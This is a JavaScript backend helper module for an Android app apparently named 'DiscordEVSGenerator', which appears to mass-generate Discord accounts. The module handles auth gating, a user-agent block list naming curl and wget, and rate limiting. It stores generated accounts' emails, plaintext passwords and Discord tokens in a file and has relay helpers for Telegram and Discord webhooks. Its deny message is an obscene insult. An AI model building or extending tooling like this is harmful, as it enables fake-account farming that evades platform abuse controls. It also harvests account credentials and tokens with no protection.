/**
 * EVS backend helpers — Vercel serverless or plain Node.
 *
 * Env:
 *   EVS_API_KEY              required (long random string)
 *   ALLOWED_APP_SIGNATURES   optional comma-separated SHA-256 hex of release certs
 *   REQUIRE_HMAC             default "1" (set "0" only while debugging)
 *   REQUIRE_APP_HEADERS      default "1" — require package + client + version
 *   MAX_SKEW_SECONDS         default 90
 *   RATE_LIMIT_PER_MIN       default 20
 *   ACCOUNT_DUP_LIMIT        default 2  (same email+pass seen this many times → block)
 *   ACCOUNT_STORE_PATH       optional file path (default: /tmp/evs_accounts.json)
 *   TG_BOT_TOKEN, TG_CHANNEL_ID
 *   TG_INSTALL_BOT_TOKEN, TG_INSTALL_CHANNEL_ID
 *   DC_WEBHOOK_URL, DC_WEBHOOK_NAME, DC_WEBHOOK_PFP
 */

const crypto = require("crypto");
const fs = require("fs");
const path = require("path");

const DENY_MSG =
  "fuck u mother fuckers, i fucked ur mom and thats why im a papa";

function readEnv(name, fallback = "") {
  const v = process.env[name];
  return v == null || v === "" ? fallback : String(v).trim();
}

function cors(res) {
  // Tight CORS — browser scripts from random origins get nothing useful
  res.setHeader("Access-Control-Allow-Origin", "null");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader(
    "Access-Control-Allow-Headers",
    [
      "Content-Type",
      "X-EVS-Key",
      "X-App-Signature",
      "X-App-Version",
      "X-App-Package",
      "X-EVS-Timestamp",
      "X-EVS-HMAC",
      "X-EVS-Client",
      "X-EVS-Reason",
      "X-EVS-Email",
      "X-EVS-Password",
      "X-EVS-Token",
    ].join(", ")
  );
}

function deny(res, code = 401) {
  res.status(code).json({
    ok: false,
    error: "forbidden",
    message: DENY_MSG,
  });
  return false;
}

const hits = new Map();
const RATE_WINDOW_MS = 60_000;
const RATE_MAX = Number(readEnv("RATE_LIMIT_PER_MIN", "20")) || 20;

function clientIp(req) {
  const xf = (req.headers["x-forwarded-for"] || "").toString().split(",")[0].trim();
  return xf || req.socket?.remoteAddress || "unknown";
}

function rateLimit(req, res) {
  const ip = clientIp(req);
  const now = Date.now();
  let row = hits.get(ip);
  if (!row || now - row.t > RATE_WINDOW_MS) {
    row = { n: 0, t: now };
    hits.set(ip, row);
  }
  row.n += 1;
  if (row.n > RATE_MAX) {
    res.status(429).json({ ok: false, error: "rate limited", message: DENY_MSG });
    return false;
  }
  return true;
}

function normalizePath(p) {
  return String(p || "")
    .split("?")[0]
    .replace(/\.js$/i, "");
}

function hmacHex(secret, message) {

  return crypto.createHmac("sha256", secret).update(message).digest("hex");
}

function timingSafeEq(a, b) {
  try {
    const ba = Buffer.from(String(a));
    const bb = Buffer.from(String(b));
    if (ba.length !== bb.length) return false;
    return crypto.timingSafeEqual(ba, bb);
  } catch (_) {
    return false;
  }
}

/**
 * Full app-only gate. Unauthorized / scripted callers get DENY_MSG.
 */
function requireAuth(req, res, pathHint) {
  if (!rateLimit(req, res)) return false;

  const expectedKey = readEnv("EVS_API_KEY");
  if (!expectedKey || expectedKey.length < 16) {
    res.status(500).json({ ok: false, error: "EVS_API_KEY not configured" });
    return false;
  }

  const gotKey = (req.headers["x-evs-key"] || "").toString().trim();
  if (!gotKey || !timingSafeEq(gotKey, expectedKey)) {
    if (readEnv("EVS_AUTH_DEBUG", "0") === "1") {
      res.status(401).json({
        ok: false,
        error: "forbidden",
        reason: "bad_key",
        keyLen: gotKey.length,
        expectLen: expectedKey.length,
        message: DENY_MSG,
      });
      return false;
    }
    return deny(res, 401);
  }

  // Must look like the official Android client
  const client = (req.headers["x-evs-client"] || "").toString().trim();
  const pkg = (req.headers["x-app-package"] || "").toString().trim();
  const ver = (req.headers["x-app-version"] || "").toString().trim();
  const ua = (req.headers["user-agent"] || "").toString();

  const requireApp = readEnv("REQUIRE_APP_HEADERS", "1") !== "0";
  if (requireApp) {
    if (client !== "DiscordEVSGenerator") return deny(res, 403);
    if (pkg !== "com.discord.evs.generator") return deny(res, 403);
    if (!ver) return deny(res, 403);
    // Block obvious non-app UAs (curl/python/postman) when REQUIRE_APP_HEADERS=1
    // Allow Android/okhttp; only block common manual API tools
    const badUa = /\b(curl|wget|postman|insomnia)\b/i.test(ua);
    if (badUa && !/DiscordEVSGenerator/i.test(ua)) return deny(res, 403);
  }

  const allowed = readEnv("ALLOWED_APP_SIGNATURES");
  if (allowed) {
    const set = new Set(
      allowed
        .split(/[,;\s]+/)
        .map((s) => s.trim().toLowerCase().replace(/:/g, ""))
        .filter(Boolean)
    );
    const gotSig = (req.headers["x-app-signature"] || "")
      .toString()
      .trim()
      .toLowerCase()
      .replace(/:/g, "");
    if (!gotSig || !set.has(gotSig)) return deny(res, 403);
  }

  const maxSkew = Number(readEnv("MAX_SKEW_SECONDS", "90")) || 90;
  const tsRaw = (req.headers["x-evs-timestamp"] || "").toString().trim();
  const ts = Number(tsRaw);
  if (!tsRaw || !Number.isFinite(ts)) return deny(res, 401);
  const now = Math.floor(Date.now() / 1000);
  if (Math.abs(now - ts) > maxSkew) return deny(res, 401);

  // HMAC required by default
  // Accept BOTH:
  //   A) ts + METHOD + path              (preferred, no body)
  //   B) ts + METHOD + path + rawBody    (legacy / current production)
  const requireHmac = readEnv("REQUIRE_HMAC", "1") !== "0";
  if (requireHmac) {
    const gotHmac = (req.headers["x-evs-hmac"] || "").toString().trim().toLowerCase();
    const method = (req.method || "GET").toUpperCase();
    const path = normalizePath(pathHint || req.url || "");
    let body = "";
    if (req.body && typeof req.body === "object") {
      try { body = JSON.stringify(req.body); } catch (_) {}
    } else if (typeof req.body === "string") {
      body = req.body;
    }
    const expectA = hmacHex(expectedKey, String(ts) + method + path);
    const expectB = hmacHex(expectedKey, String(ts) + method + path + body);
    const ok = gotHmac && (timingSafeEq(gotHmac, expectA) || timingSafeEq(gotHmac, expectB));
    if (!ok) {
      if (readEnv("EVS_AUTH_DEBUG", "0") === "1") {
        res.status(401).json({
          ok: false,
          error: "forbidden",
          reason: "bad_hmac",
          path,
          message: DENY_MSG,
        });
        return false;
      }
      return deny(res, 401);
    }
  }

  return true;
}

const requireApiKey = requireAuth;

async function readJson(req) {
  if (req.body && typeof req.body === "object") return req.body;
  if (typeof req.body === "string" && req.body) {
    try {
      return JSON.parse(req.body);
    } catch (_) {
      return {};
    }
  }
  return {};
}

// ── Account store (memory + optional file) ───────────────────────────────────

function storePath() {
  return readEnv("ACCOUNT_STORE_PATH", path.join("/tmp", "evs_accounts.json"));
}

function loadStore() {
  const g = global;
  if (g.__evsAccountStore) return g.__evsAccountStore;
  let data = { accounts: [], blocked: {}, hits: {} };
  try {
    const p = storePath();
    if (fs.existsSync(p)) {
      data = JSON.parse(fs.readFileSync(p, "utf8"));
    }
  } catch (_) {}
  if (!data.accounts) data.accounts = [];
  if (!data.blocked) data.blocked = {};
  if (!data.hits) data.hits = {};
  g.__evsAccountStore = data;
  return data;
}

function saveStore(data) {
  const g = global;
  g.__evsAccountStore = data;
  try {
    fs.writeFileSync(storePath(), JSON.stringify(data, null, 0), "utf8");
  } catch (_) {
    /* /tmp may be read-only on some hosts — memory still works for the instance */
  }
}

function credKey(email, password) {
  return crypto
    .createHash("sha256")
    .update(String(email || "").toLowerCase().trim() + "\n" + String(password || ""))
    .digest("hex");
}

/**
 * Record a generated account. Returns { ok, blocked, count, message }.
 * Same email+password seen ACCOUNT_DUP_LIMIT+ times → blocked.
 */
function recordAccount({ email, password, token, reason, device, version }) {
  const dupLimit = Number(readEnv("ACCOUNT_DUP_LIMIT", "2")) || 2;
  const store = loadStore();
  const key = credKey(email, password);

  if (store.blocked[key]) {
    return {
      ok: false,
      blocked: true,
      count: store.hits[key] || 0,
      message: "duplicate credentials blocked",
    };
  }

  store.hits[key] = (store.hits[key] || 0) + 1;
  const count = store.hits[key];

  store.accounts.push({
    email: String(email || "").slice(0, 200),
    password: String(password || "").slice(0, 200),
    token: String(token || "").slice(0, 400),
    reason: String(reason || "").slice(0, 120),
    device: String(device || "").slice(0, 64),
    version: String(version || "").slice(0, 32),
    at: Date.now(),
    key,
  });
  // Keep last 5000
  if (store.accounts.length > 5000) {
    store.accounts = store.accounts.slice(-5000);
  }

  if (count >= dupLimit) {
    store.blocked[key] = { at: Date.now(), count };
    saveStore(store);
    return {
      ok: false,
      blocked: true,
      count,
      message: `same account reported ${count} times — blocked`,
    };
  }

  saveStore(store);
  return { ok: true, blocked: false, count, message: "stored" };
}

function listRecentAccounts(limit = 50) {
  const store = loadStore();
  return store.accounts.slice(-limit).reverse();
}

async function tgSendMessage(bot, chat, text) {
  if (!bot || !chat) return { ok: false, error: "tg not configured" };
  try {
    const r = await fetch(`https://api.telegram.org/bot${bot}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chat,
        text: String(text).slice(0, 3900),
        parse_mode: "Markdown",
        disable_web_page_preview: true,
      }),
    });
    const j = await r.json().catch(() => ({}));
    return { ok: !!j.ok, error: j.description };
  } catch (e) {
    return { ok: false, error: e.message };
  }
}

async function discordWebhook(url, content, username, avatar) {
  if (!url) return { ok: false, error: "webhook not configured" };
  try {
    const r = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: String(content).slice(0, 1900),
        username: username || "EVS",
        avatar_url: avatar || undefined,
      }),
    });
    return { ok: r.ok || r.status === 204 };
  } catch (e) {
    return { ok: false, error: e.message };
  }
}

module.exports = {
  readEnv,
  cors,
  deny,
  DENY_MSG,
  requireAuth,
  requireApiKey,
  readJson,
  rateLimit,
  hmacHex,
  clientIp,
  recordAccount,
  listRecentAccounts,
  tgSendMessage,
  discordWebhook,
};
